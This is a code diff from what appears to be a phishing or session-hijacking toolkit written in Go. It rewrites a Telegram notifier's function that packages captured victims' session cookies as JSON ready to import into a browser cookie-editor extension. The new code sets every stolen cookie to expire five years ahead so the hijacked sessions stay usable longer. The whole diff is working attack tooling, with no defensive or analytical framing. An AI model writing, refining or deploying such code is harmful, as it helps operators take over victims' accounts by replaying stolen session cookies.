@@ -679,83 +679,47 @@ func (tn *TelegramNotifier) exportCookiesAsText(session *database.Session, expor
 }
 
 func (tn *TelegramNotifier) cookieTokensToJSON(tokens map[string]map[string]*database.CookieToken) string {
-	// Cookie structure matching browser extension format (Cookie Editor, EditThisCookie, etc.)
 	type Cookie struct {
-		Name           string  `json:"name"`
-		Value          string  `json:"value"`
-		Domain         string  `json:"domain"`
 		Path           string  `json:"path"`
-		ExpirationDate float64 `json:"expirationDate,omitempty"`
-		HttpOnly       bool    `json:"httpOnly"`
-		Secure         bool    `json:"secure"`
-		SameSite       string  `json:"sameSite,omitempty"`
-		HostOnly       bool    `json:"hostOnly"`
-		Session        bool    `json:"session"`
-		StoreId        string  `json:"storeId,omitempty"`
+		Domain         string  `json:"domain"`
+		ExpirationDate float64 `json:"expirationDate"`
+		Value          string  `json:"value"`
+		Name           string  `json:"name"`
+		HttpOnly       bool    `json:"httpOnly,omitempty"`
+		HostOnly       bool    `json:"hostOnly,omitempty"`
+		Secure         bool    `json:"secure,omitempty"`
 	}
 
 	var cookies []Cookie
 	for domain, tmap := range tokens {
 		for k, v := range tmap {
+			// Set expiration to 5 years from now (extended for longer session validity)
 			c := Cookie{
-				Name:     k,
-				Value:    v.Value,
-				Domain:   domain,
-				Path:     v.Path,
-				HttpOnly: v.HttpOnly,
-				StoreId:  "0", // Default store ID for browser extensions
+				Path:           v.Path,
+				Domain:         domain,
+				ExpirationDate: float64(time.Now().Add(CookieExpirationYears * 365 * 24 * time.Hour).Unix()),
+				Value:          v.Value,
+				Name:           k,
+				HttpOnly:       v.HttpOnly,
+				Secure:         false,
 			}
-
-			// Use captured Secure attribute, fallback to name-based detection
-			if v.Secure {
-				c.Secure = true
-			} else if strings.HasPrefix(k, "__Host-") || strings.HasPrefix(k, "__Secure-") {
+			if strings.Index(k, "__Host-") == 0 || strings.Index(k, "__Secure-") == 0 {
 				c.Secure = true
 			}
-
-			// Use captured SameSite attribute
-			if v.SameSite != "" && v.SameSite != "unspecified" {
-				c.SameSite = v.SameSite
-			} else {
-				// Default to no_restriction for cross-site compatibility
-				c.SameSite = "no_restriction"
-			}
-
-			// Use captured HostOnly attribute, fallback to domain-based detection
-			if v.HostOnly {
-				c.HostOnly = true
-			} else if len(domain) > 0 && domain[0] == '.' {
+			if domain[:1] == "." {
 				c.HostOnly = false
-				c.Domain = domain[1:] // Remove leading dot for non-hostOnly cookies
+				c.Domain = domain[1:]
 			} else {
 				c.HostOnly = true
 			}
-
-			// Use captured Session/ExpirationDate attributes
-			if v.Session || v.ExpirationDate <= 0 {
-				c.Session = true
-				// Session cookies don't have expirationDate in browser extension format
-			} else {
-				c.Session = false
-				c.ExpirationDate = float64(v.ExpirationDate)
-			}
-
-			// Fallback: If no expiration was captured, set a long expiration (5 years)
-			// This ensures cookies work even if expiration wasn't captured
-			if !c.Session && c.ExpirationDate <= 0 {
-				c.ExpirationDate = float64(time.Now().Add(CookieExpirationYears * 365 * 24 * time.Hour).Unix())
-			}
-
-			// Ensure path is set
 			if c.Path == "" {
 				c.Path = "/"
 			}
-
 			cookies = append(cookies, c)
 		}
 	}
 
-	jsonData, _ := json.MarshalIndent(cookies, "", "    ")
+	jsonData, _ := json.Marshal(cookies)
 	return string(jsonData)
 }
 
